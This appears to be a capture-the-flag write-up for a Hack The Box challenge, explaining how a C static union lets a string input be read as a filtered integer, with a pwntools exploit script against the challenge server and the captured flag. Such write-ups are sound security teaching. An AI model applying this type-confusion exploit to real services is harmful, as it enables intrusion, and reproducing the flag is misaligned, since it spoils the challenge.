For this challenge, we need to reach the `get_flag` function however it will show us the flag only if the Datastore is equal to 13371337. The tricky part is that we can't assign the Datastore that integer because it's filtered, so we need to find a way around it.

![image](https://user-images.githubusercontent.com/80063008/198272933-b2d33f7c-ebf5-4cb4-b9b7-0cadfaf1e65d.png)

To be able to do so, we need to experiment a bit with the application to understand what it is actually doing because the prompts don't make much sense.

We have 3 actions defined: Set (T), Get (R) and Flag (C).

![image](https://user-images.githubusercontent.com/80063008/198272724-baea7189-d4ba-41f2-9676-bb2594010686.png) ![image](https://user-images.githubusercontent.com/80063008/198272849-0e427d1f-f948-4b4e-a324-90c7fac77124.png)

We can set either an integer (L) or a string (S).

![image](https://user-images.githubusercontent.com/80063008/198272749-d5a1ca6f-4adc-4366-983a-5bd6050fe206.png) ![image](https://user-images.githubusercontent.com/80063008/198272782-23be3efa-39a7-46a5-9c9c-de8adb1ed1be.png)

Now that we understand what to do with the prompts, we can have a closer look in the source code and we notice a vulnerability in static union:

https://stackoverflow.com/questions/7259830/why-and-when-to-use-static-structures-in-c-programming

![image](https://user-images.githubusercontent.com/80063008/198273071-48a297b1-225e-4ff1-86c0-79457f680ccd.png)

So, what would happen if we store our desired integer (13371337) as a "string"?! I used quotation here because if we store it as an actual string, nothing would happen, it would simply be seen as a string. However if we send the bytes of the integer in the string parameter, when we try to get the flag, it will be read as an integer, cool/weird right?!


```python
#!/usr/bin/python3

from pwn import *
context.log_level = 'warn'

#p = process('./entity')
p = remote('161.35.33.46', 32217)

p.recvuntil(b">>")
p.sendline('T')     #set
p.recvuntil(b">>")
p.sendline('S')     #as string
p.recvuntil(b">>")
p.sendline(p64(13371337)) #send our "string" in bytes form
p.recvuntil(b">>")
p.sendline('C') #read the flag
p.interactive()
```
![image](https://user-images.githubusercontent.com/80063008/198273283-39c6dbac-0694-4b8f-9afb-05a736cd4247.png)

HTB{f1ght_34ch_3nt1ty_45_4_un10n}